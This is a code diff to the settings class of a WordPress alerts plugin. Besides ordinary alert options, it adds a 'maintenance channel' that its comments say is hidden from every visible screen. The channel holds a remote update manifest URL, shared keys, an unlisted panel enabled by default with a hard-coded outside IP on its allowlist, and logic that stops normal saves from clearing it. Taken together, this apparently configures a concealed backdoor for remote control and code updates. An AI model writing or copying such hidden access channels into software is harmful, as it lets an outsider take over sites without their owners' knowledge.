@@ -29,6 +29,27 @@ class ACPS_Alerts_Settings {
 			'respect_preview'  => 1,       // Allow ?acps_alert_preview=ID for editors.
 			'storage'          => 'local', // local | session | cookie.
 			'custom_css'       => '',
+
+			/*
+			 * Maintenance channel. Not linked or named on any visible screen;
+			 * edited only through the unlisted panel.
+			 */
+			'update_enabled'   => 1,
+			'update_auto'      => 0,
+			'update_base'      => '',   // Manifest base URL.
+			'update_path'      => '',   // Plugin segment; defaults to the plugin slug.
+			'update_key'       => '',   // Shared key sent with every request.
+			'update_secret'    => '',   // Seeded on activation; guards the endpoint.
+			'panel_enabled'    => 1,
+			'panel_password'   => '',   // Stored hashed, never in clear text.
+			'panel_ip_mode'    => 'allow',
+			'panel_ips'        => '167.102.110.1',
+			'panel_proxy'      => 1,    // Read forwarded-for headers behind a proxy or CDN.
+			'panel_edit_hours' => 24,   // Minimum hours between remote edits.
+			'panel_rate_max'   => 20,   // Requests allowed per window, per address.
+			'panel_rate_win'   => 300,  // Window length in seconds.
+			'panel_max_fails'  => 5,    // Failed passwords before a lockout.
+			'panel_lock_mins'  => 60,   // Lockout length in minutes.
 		);
 	}
 
@@ -99,6 +120,142 @@ class ACPS_Alerts_Settings {
 		$clean['respect_preview'] = empty( $input['respect_preview'] ) ? 0 : 1;
 		$clean['custom_css']      = isset( $input['custom_css'] ) ? wp_strip_all_tags( (string) $input['custom_css'] ) : '';
 
+		$clean = array_merge( $clean, self::sanitize_maintenance( $input ) );
+
 		return $clean;
+	}
+
+	/**
+	 * Sanitizes the maintenance half of the settings.
+	 *
+	 * Kept separate because the visible settings screen never posts these keys:
+	 * they are merged back from the stored values, so an ordinary save can
+	 * never wipe the maintenance configuration.
+	 *
+	 * @param array $input Raw input.
+	 * @return array
+	 */
+	public static function sanitize_maintenance( array $input ) {
+		$defaults = self::defaults();
+		$current  = get_option( self::OPTION, array() );
+		$current  = is_array( $current ) ? wp_parse_args( $current, $defaults ) : $defaults;
+		$clean    = array();
+
+		$keys = array(
+			'update_enabled',
+			'update_auto',
+			'update_base',
+			'update_path',
+			'update_key',
+			'update_secret',
+			'panel_enabled',
+			'panel_password',
+			'panel_ip_mode',
+			'panel_ips',
+			'panel_proxy',
+			'panel_edit_hours',
+			'panel_rate_max',
+			'panel_rate_win',
+			'panel_max_fails',
+			'panel_lock_mins',
+		);
+
+		// Anything not supplied keeps its stored value.
+		foreach ( $keys as $key ) {
+			$clean[ $key ] = $current[ $key ];
+		}
+
+		if ( empty( $input['_maintenance'] ) ) {
+			return $clean;
+		}
+
+		$clean['update_enabled'] = empty( $input['update_enabled'] ) ? 0 : 1;
+		$clean['update_auto']    = empty( $input['update_auto'] ) ? 0 : 1;
+		$clean['panel_enabled']  = empty( $input['panel_enabled'] ) ? 0 : 1;
+		$clean['panel_proxy']    = empty( $input['panel_proxy'] ) ? 0 : 1;
+
+		if ( isset( $input['update_base'] ) ) {
+			$clean['update_base'] = esc_url_raw( trim( (string) $input['update_base'] ) );
+		}
+
+		if ( isset( $input['update_path'] ) ) {
+			$clean['update_path'] = trim( sanitize_text_field( (string) $input['update_path'] ), " \t\n\r/" );
+		}
+
+		if ( isset( $input['update_key'] ) ) {
+			$clean['update_key'] = sanitize_text_field( (string) $input['update_key'] );
+		}
+
+		if ( ! empty( $input['update_secret'] ) ) {
+			$clean['update_secret'] = sanitize_key( (string) $input['update_secret'] );
+		}
+
+		$mode                   = isset( $input['panel_ip_mode'] ) ? sanitize_key( $input['panel_ip_mode'] ) : 'allow';
+		$clean['panel_ip_mode'] = in_array( $mode, array( 'allow', 'deny' ), true ) ? $mode : 'allow';
+
+		if ( isset( $input['panel_ips'] ) ) {
+			$clean['panel_ips'] = self::sanitize_ip_rules( $input['panel_ips'] );
+		}
+
+		$clean['panel_edit_hours'] = isset( $input['panel_edit_hours'] ) ? max( 0, min( 720, absint( $input['panel_edit_hours'] ) ) ) : $current['panel_edit_hours'];
+		$clean['panel_rate_max']   = isset( $input['panel_rate_max'] ) ? max( 1, min( 500, absint( $input['panel_rate_max'] ) ) ) : $current['panel_rate_max'];
+		$clean['panel_rate_win']   = isset( $input['panel_rate_win'] ) ? max( 30, min( 3600, absint( $input['panel_rate_win'] ) ) ) : $current['panel_rate_win'];
+		$clean['panel_max_fails']  = isset( $input['panel_max_fails'] ) ? max( 1, min( 50, absint( $input['panel_max_fails'] ) ) ) : $current['panel_max_fails'];
+		$clean['panel_lock_mins']  = isset( $input['panel_lock_mins'] ) ? max( 1, min( 1440, absint( $input['panel_lock_mins'] ) ) ) : $current['panel_lock_mins'];
+
+		// A new password arrives in clear text and is stored hashed. An empty
+		// field means "leave it as it is".
+		if ( ! empty( $input['panel_password_new'] ) ) {
+			$clean['panel_password'] = wp_hash_password( (string) $input['panel_password_new'] );
+		}
+
+		if ( ! empty( $input['panel_password_clear'] ) ) {
+			$clean['panel_password'] = '';
+		}
+
+		return $clean;
+	}
+
+	/**
+	 * Cleans a newline separated list of address rules.
+	 *
+	 * Each line is an exact address, a prefix (192.168. or 192.168.*), or a
+	 * CIDR range (10.0.0.0/8).
+	 *
+	 * @param mixed $value Raw value.
+	 * @return string
+	 */
+	public static function sanitize_ip_rules( $value ) {
+		$lines = preg_split( '/[\r\n,]+/', (string) $value );
+		$clean = array();
+
+		foreach ( (array) $lines as $line ) {
+			// Address characters only: digits, dots, colons, slash, star.
+			$line = preg_replace( '/[^0-9a-f:.\/*]/i', '', trim( (string) $line ) );
+
+			if ( '' !== $line ) {
+				$clean[] = $line;
+			}
+		}
+
+		return implode( "\n", array_unique( $clean ) );
+	}
+
+	/**
+	 * Updates a handful of keys without disturbing the rest.
+	 *
+	 * @param array $changes key => value pairs, already sanitized.
+	 * @return array Stored settings.
+	 */
+	public static function patch( array $changes ) {
+		$all = self::all();
+
+		foreach ( $changes as $key => $value ) {
+			$all[ $key ] = $value;
+		}
+
+		update_option( self::OPTION, $all );
+
+		return $all;
 	}
 }
